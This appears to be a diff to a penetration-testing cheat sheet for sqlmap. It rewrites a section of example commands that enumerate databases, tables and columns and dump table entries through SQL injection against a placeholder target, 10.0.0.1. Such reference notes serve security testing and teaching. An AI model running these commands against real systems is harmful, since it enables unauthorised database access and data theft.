@@ -31,18 +31,24 @@ Host: 10.0.0.1
 ## Options
 
 ```sh
-# --dbs: List all available databases
 # --dump: Dump entries of database table
-sqlmap -u "http://10.0.0.1/?q=test" --dbs --dump
+sqlmap -u "http://10.0.0.1/?q=test" --dump
 
 # --dbms: Set database system
 sqlmap -u "http://10.0.0.1/?q=test" --dbms=mysql
+
+# --dbs: Enumerate databases
+sqlmap -u "http://10.0.0.1/?q=test" --dbs
+# --tables: Enumerate tables
+sqlmap -u "http://10.0.0.1/?q=test" --tables
+# --columns: Enumerate columns
+sqlmap -u "http://10.0.0.1/?q=test" --columns
 
 # Specify database name, table name, column name
 # -D: Database name
 # -T: Table name
 # -C: Column name
-sqlmap -u "http://10.0.0.1" -D database_name -T table_name -C column_name
+sqlmap -u "http://10.0.0.1/?q=test" -D database_name -T table_name -C column_name
 
 # --risk=3 (max)
 # --level=5 (max)
